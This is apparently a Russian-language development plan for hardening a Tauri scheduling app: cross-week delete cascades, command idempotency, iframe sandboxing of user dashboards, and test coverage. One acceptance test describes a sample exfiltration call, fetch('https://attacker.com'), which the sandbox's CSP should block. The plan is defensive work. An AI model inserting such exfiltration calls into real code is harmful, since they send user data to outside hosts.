# R1 Phase 3 — Hard + Critical

> **Pre-flight:** прочитай `../PRE-FLIGHT.md` ПЕРЕД стартом.
> Каждый пункт фазы — отдельный спринт, не bundle'ь. Перед
> любым пунктом — re-grep актуальных строк.

## Контекст

Тяжёлые правки, которые закрывают реальные риски целостности
данных или security при росте использования (особенно при
потоке команд от агента). Не блокеры на release v2 — единичный пользователь
вряд ли упирается в них, — но к Phase 10+ должны быть закрыты,
иначе долги станут дорогими.

Каждый пункт = отдельный спринт (1-3 дня работы) или
самостоятельная фаза. Делать по одному, не bundle'ить.

## Scope

| # | Severity | Path:line | Задача | Effort |
|---|---|---|---|---|
| 1 | high | `src/services/command-executor.ts:191-194` (полный) | `delete_entity` cross-week cascade: walk через все `data/schedule/*.json` и `data/pool/*.json`, удалить blocks/pool items с `source_entity_id === id`. Routed через write-queues. Также: clear `parent_project_id` на tasks при удалении project. Активный week уже сделан в Phase 1 A9. | M |
| 2 | medium | `src/services/pool-actions.ts:88-107` | Cross-week pool delete cascade. Сейчас удаляет blocks только в той же неделе что pool item. Если block в другой неделе ссылается на этот pool_item_id — orphan. Walk через `data/schedule/*.json`, удалить linked blocks. | M |
| 3 | high | `src/services/command-processor.ts:99-190` | Idempotency: либо persistent executed-log (`data/commands/.executed.json` с last N command IDs, skip если cmd.id в списке), либо `processing/` sub-folder pattern (rename pending→processing ДО exec, на success→done/, на fail→failed/, на boot drain — processing/ как failed/). Решает H11 (markDone failure → re-execute → duplicate side effects). | L |
| 4 | high | `src/services/dashboard-compiler.ts:41-107` | Sandbox dashboards в iframe (или separate WebView без Tauri capabilities). Pass props через `postMessage`. Сейчас `new Function` в main webview = full window/DOM/Tauri access; renderer compromise (XSS в dashboard) = full IPC. Phase 9 D2 keep'нул — остаётся; sandbox = defensive hardening для будущего. | L |
| 5 | high | (множество новых файлов) | Тесты: `src/services/command-processor.test.ts`, `src/services/file-io.test.ts` (corrupt recovery paths), `src/services/{pool,week,horizon,entities,config}-write-queue.test.ts` (после Phase 1 A1+A2), `src/store/{entities,schedule,pool,horizon,commands,dashboards}.test.ts` (cascade, race-protection, file-rollback). In-memory FS mock (path → content map). | L |

## Шаги реализации

### #1 — `delete_entity` cross-week cascade

1. Helper: `services/cross-week-sweep.ts` экспортирует `sweepBlocksByEntityId(entityId)` и `sweepPoolItemsByEntityId(entityId)`. Внутри: list schedule/pool dirs, для каждого file — `applyToWeek` / `applyToPoolWeek` с filter (routed через queues).
2. В `command-executor.ts case "delete_entity"`: после `useEntityStore.deleteEntity(id)` — `await Promise.all([sweepBlocksByEntityId(id), sweepPoolItemsByEntityId(id)])`.
3. Также: scan entities — если `e.type === "task" && e.fields.parent_project_id === deletedId` → set null (через update batched). Goals/metrics: clear `linked_metric_ids`, `linked_goal_id` references.
4. Тесты: создать direction с 5 связанными blocks в 3 разных неделях, удалить → все blocks ушли.

### #2 — pool delete cross-week cascade

1. Параллельно с #1: `sweepBlocksByPoolItemId(poolItemId)`.
2. В `pool-actions.ts deletePoolItemCascade` — после удаления pool item: scan ВСЕ schedule files, удалить blocks с этим pool_item_id (не только активную неделю).
3. Альтернатива (cheaper): `cleanupOrphanBlocks` runs on app boot — сравнить blocks.pool_item_id с pool.items в той же неделе, null'ить orphans (не удалять, чтобы не терять scheduled time).

### #3 — Command idempotency

Два варианта:

**Вариант A (cheaper, executed log):**
1. `data/commands/.executed.json`: `{ ids: ["cmd-X", "cmd-Y", ...] }` (last 1000)
2. processor `processOne` start: `if (executed.has(cmd.id)) { markDone(); return; }`
3. После `executeCommand` success — добавить cmd.id в executed log, persist.
4. Boot drain тоже использует.

**Вариант B (stronger, processing folder):**
1. Boot drain: rename все `pending/*.json` → `processing/*.json` (atomic rename). Затем для каждого — exec → done/ или failed/.
2. Live listener: на event — `move_file(pending/X, processing/X)` ДО exec.
3. Crash recovery: `processing/*.json` на следующем boot = "executed but not finalized" — перенести в failed/ с message «interrupted».

Рекомендация: B (stronger semantics), но требует watcher accept "processing/*" не emit'ить как pending.

### #4 — Dashboard iframe sandbox

1. `<iframe sandbox="allow-scripts" src="about:blank">` в `<DashboardHost>`.
2. Передать compiled JSX + props через `postMessage` после load.
3. Iframe code: получает props, рендерит React в свою root.
4. Iframe не имеет `__TAURI__` global → invoke невозможен.
5. CSP iframe: только `'self'` или `data:` чтобы compiled JSX inline'ить.

### #5 — Tests

Приоритет: command-processor → file-io recovery → write-queues → stores. Отдельный коммит на каждый. Использовать общий `test-helpers/in-memory-fs.ts` для mock.

## Acceptance criteria

### #1
- [ ] direction с 3 blocks в 3 weeks → delete → all 3 weeks updated, blocks gone
- [ ] task с pool_item с placed block → delete entity → pool_item + block ушли
- [ ] project с 5 связанными tasks → delete project → tasks остаются с `parent_project_id: null`
- [ ] `task check` zelёный

### #2
- [ ] pool_item с blocks в 2 weeks → delete pool_item → blocks из обеих weeks ушли
- [ ] orphan block (pool_item_id указывает на не-существующий) → on boot, null'ится (если выбран вариант с cleanupOrphanBlocks)

### #3
- [ ] crash mid-markDone (mock) → on restart, command не re-executes (executed log) ИЛИ перенесён в failed/ (processing folder)
- [ ] retry того же `cmd.id` → second run no-op'ит

### #4
- [ ] dashboard JSX делает `window.__TAURI__.invoke(...)` → throws (no global)
- [ ] dashboard exfil попытка `fetch('https://attacker.com')` → CSP block

### #5
- [ ] coverage report: command-processor ≥80%, file-io recovery 100% paths, all write-queues 100%, stores ≥70%

## Smoke

Каждый пункт — независимый smoke от пользователя.

- **#1:** Создать direction с 5 проектами с задачами в трёх неделях. Удалить direction. Проверить files на диске.
- **#2:** Создать atomic pool item, перенести в две недели через `move_block`, удалить pool item. Проверить obе weeks.
- **#3:** Mock crash через `kill -9` посередине markDone. Перезапуск → behaviour matches вариант.
- **#4:** Открыть dashboard, в DevTools console: `__TAURI__` → undefined.
- **#5:** `task test` показывает coverage ≥ targets.

## Ловушки

- **R1 (#1 cross-week walk).** Если пользователь имеет 100+ weeks — sweep 100+ files. Использовать write-queues корректно (не блокировать UI). Можно сделать chunked (10 weeks at a time).
- **R2 (#3 processing/ folder).** Watcher сейчас watch'ит `pending/`. Если processing/ внутри commands/ — нужно добавить пропуск, иначе rename → fire pending event → infinite loop.
- **R3 (#4 iframe).** React 19 root в iframe — postMessage transit JSX строкой. Performance может пострадать при rapid updates. Кэшировать compiled component в iframe-side.
- **R4 (#5 in-memory FS).** Tauri invoke mock должен правильно эмулировать atomic rename, иначе test pass где prod fail.

## Что НЕ включает

- Performance refactor (re-renders) — Phase 4
- TypeScript noUncheckedIndexedAccess — Phase 4
- useUIStore / useBlockGesture splits — Phase 4
- Versioned file migrators — Phase 4
- Splittable pool overscheduling — Phase 4
- Watcher cache invalidation — Phase 4
- Title denormalization — Phase 4
